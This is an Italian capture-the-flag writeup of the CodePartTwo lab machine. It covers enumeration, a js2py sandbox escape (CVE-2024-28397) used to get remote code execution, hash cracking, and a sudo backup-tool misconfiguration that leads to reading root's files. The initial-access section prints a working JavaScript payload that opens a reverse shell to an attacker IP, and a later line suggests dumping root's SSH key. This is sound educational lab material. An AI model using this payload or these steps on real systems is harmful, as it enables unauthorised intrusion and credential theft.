+++
date = '2026-09-15T14:18:29+02:00'
draft = false
title = 'CodePartTwo Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`09/10/2025`**

![pwn.png](/images/imgs_code2/pwn.png)

---
# Introduzione

**_CodePartTwo_** è una macchina **Linux** di livello **Easy** che funge da continuazione diretta della macchina **_Code_** originale, spostando il focus sull'analisi del codice sorgente e sullo sfruttamento di vulnerabilità note in dipendenze non aggiornate.

L'exploitation path inizia scaricando il codice sorgente dell'applicazione web e identificando una versione vulnerabile della libreria **js2py**. Modificando un **PoC** pubblico per una **sandbox escape** (**CVE-2024-28397**), ho ottenuto una **Remote Code Execution** (**RCE**). Il lateral movement rispecchia la prima macchina, richiedendo l'enumerazione di un database **SQLite** locale e il cracking degli hash per pivotare sull'utente **marco**. Infine, la Privilege Escalation prevede l'abuso di un binario di backup personalizzato che consente agli utenti di fornire un file di configurazione arbitrario, portando all'estrazione della **root flag** tramite **arbitrary file reading**.

---
# Tecniche Utilizzate 

- **js2py Sandbox Escape (CVE-2024-28397)**

- **Database Dump**

- **Hash Cracking**

- **Arbitrary File Read via Sudo privilege misconfiguration**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- code2 
```

```text
PORT      STATE    SERVICE
22/tcp    open     ssh
8000/tcp  open     http-alt
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV code2 
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte Aperte**:

- **22**/tcp - SSH

- **8000**/tcp - Web (Gunicorn)

---
# Accesso Iniziale | js2py Sandbox Escape

Sulla porta **8000**, era hostata la piattaforma _CodePartTwo_. La homepage presentava tre opzioni: **`LOGIN`**, **`REGISTER`**, e **`DOWNLOAD APP`**.

![web1.png](/images/imgs_code2/web1.png)

Ho lanciato in background una scansione delle directory con **gobuster**, registrato un utente fittizio e fatto il login.

![platform.png](/images/imgs_code2/platform.png)

Similmente alla prima macchina, la dashboard presentava un **web interpreter Python/JS**. Invece di testare immediatamente l'input in ottica black-box, ho cliccato su **`DOWNLOAD APP`** per passare a un approccio di test white-box.

Analizzando il codice sorgente scaricato, ho trovato un database vuoto in:
- **`app/instance`**

![rabbit.png](/images/imgs_code2/rabbit.png)

L'**`app.secret_key`** in **`app.py`** (che ho annotato, anche se non era immediatamente sfruttabile).

![code.png](/images/imgs_code2/code.png)

La vera svolta è stata l'analisi del file **`requirements.txt`**, che elencava le dipendenze dell'applicazione:

![version.png](/images/imgs_code2/version.png)

**`js2py==0.74`** ha attirato la mia attenzione. Ho analizzato **`app.py`** per vedere come fosse implementata questa specifica libreria e ho trovato la seguente route:

![js2.png](/images/imgs_code2/js2.png)

L'applicazione prendeva il codice fornito dall'utente e lo passava direttamente a **`js2py.eval_js()`**. Cercando online "**js2py 0.74 sandbox escape**", ho trovato subito un repository pubblico che descriveva la **`CVE-2024-28397`**.

- https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape

**Nota**: _**`js2py`** è una libreria concepita per eseguire **JavaScript** in modo sicuro all'interno di un ambiente **Python**. Tuttavia, la versione **`0.74`** è vulnerabile ad una **sandbox escape**. La vulnerabilità nasce perché la libreria gestisce in modo improprio gli oggetti **Python** e i riferimenti alle funzioni esposti al contesto **JavaScript**. Un attaccante può creare del **JavaScript** malevolo che raggiunge l'interprete **Python** sottostante, bypassando la sandbox ed eseguendo **comandi OS arbitrari**._

Ho preso il payload dal **PoC** (che originariamente era progettato per leggere **`/etc/passwd`** e avviare una calcolatrice) e l'ho modificato per eseguire una classica reverse shell.

```javascript
let cmd = "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/22667 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

Dopo aver iniettato il payload modificato nel web interpreter e aver impostato un listener **netcat**, ho ottenuto una shell come utente **`app`**.

![initial.jpeg](/images/imgs_code2/initial.jpeg)

---
# Lateral Movement | SQLite to SSH

All'interno del target, ho enumerato nuovamente la directory **`app/instance/`**. A differenza del database vuoto trovato nel codice sorgente scaricato, il sistema live conteneva un file **`users.db`** popolato.

Utilizzando **sqlite3**, mi sono connesso al database per estrarne i contenuti:

```SQL
.tables
select * from user;
```

![db.png](/images/imgs_code2/db.png)

Questa query ha restituito due password hashate, che ho copiato e craccato utilizzando **Crackstation**.

- https://crackstation.net/

![crack.png](/images/imgs_code2/crack.png)

Ho effettuato il lateral movement connettendomi tramite **SSH** come utente **`marco`**.

![userf.png](/images/imgs_code2/userf.png)

---
# Privilege Escalation | Arbitrary File Read via Sudo privilege misconfiguration

Ho subito verificato i privilegi **sudo**:

```bash
sudo -l
```

![sudol.png](/images/imgs_code2/sudol.png)

Potevo eseguire **`npbackup-cli`** come **root** senza password. Nella home directory, ho notato un file di configurazione chiamato **`npbackup.conf`**.

![home.png](/images/imgs_code2/home.png)

![conf.png](/images/imgs_code2/conf.png)

Osservando l'esecuzione dello script, ho notato che effettuava un controllo bloccando attivamente la flag **`--external-backend-binary`**, impedendo una diretta **OS command injection**.

Per comprendere le funzionalità previste, ho consultato il menu **help**:

```bash
sudo /usr/local/bin/npbackup-cli --help
```

L'output ha rivelato diverse flag interessanti:

**`1`**. **-b** : esegue un backup.

**`2`**. **-f** : forza l'esecuzione.

**`3`**. **-c** : percorso per un file di configurazione alternativo (di default usa dir_corrente/npbackup.conf).

**`4`**. **--ls**: elenca il contenuto di un archivio di backup specificato.

**`5`**. **--dump**: estrae e stampa il contenuto di un file specifico dal backup.

**Nota**: _La flag **`-c`** è la vulnerabilità critica. Poiché lo script viene eseguito come **root**, si fiderà ciecamente e leggerà qualsiasi file di configurazione gli passiamo. Questo significava poter dire all'utility di backup di puntare alla directory **`/root`** fornendo un file di configurazione modificato._

Ho copiato la configurazione di default, l'ho modificata e ho cambiato il percorso di destinazione del backup in **`/root`**:

```bash
cp npbackup.conf fall.conf
nano fall.conf # Modificato il target path del backup in /root
```

![priv1.png](/images/imgs_code2/priv1.png)

Successivamente, ho eseguito il processo di backup utilizzando il mio file di configurazione malevolo:

```bash
sudo /usr/local/bin/npbackup-cli -b -c fall.conf -f
```

![priv2.png](/images/imgs_code2/priv2.png)

Per leggere il contenuto del backup di **root** appena creato, ho utilizzato le flag integrate di listing e dumping dello script:

```bash
sudo /usr/local/bin/npbackup-cli -c fall.conf --ls
sudo /usr/local/bin/npbackup-cli -c fall.conf --dump /root/root.txt
```

![privls.png](/images/imgs_code2/privls.png)

Questo ha stampato il contenuto della **root flag** direttamente nel mio terminale.

![rootf.png](/images/imgs_code2/rootf.png)

Per ottenere persistenza e una compromissione totale del sistema, l'esatto comando **`--dump`** può essere utilizzato per estrarre la chiave privata **`/root/.ssh/id_rsa`**.

---
# Considerazioni Finali

**_CodePartTwo_** è un'ottima continuazione della macchina originale. Dimostra l'importanza di passare da una mentalità black-box ad un approccio white-box quando è disponibile il codice sorgente. La **CVE** di **js2py** è un ottimo promemoria di come le dipendenze obsolete siano spesso la via d'accesso più semplice ad un sistema. La privilege escalation modella un errore di configurazione molto comune nel mondo reale: consentire agli utenti di passare file di configurazione arbitrari a binari eseguiti con privilegi elevati.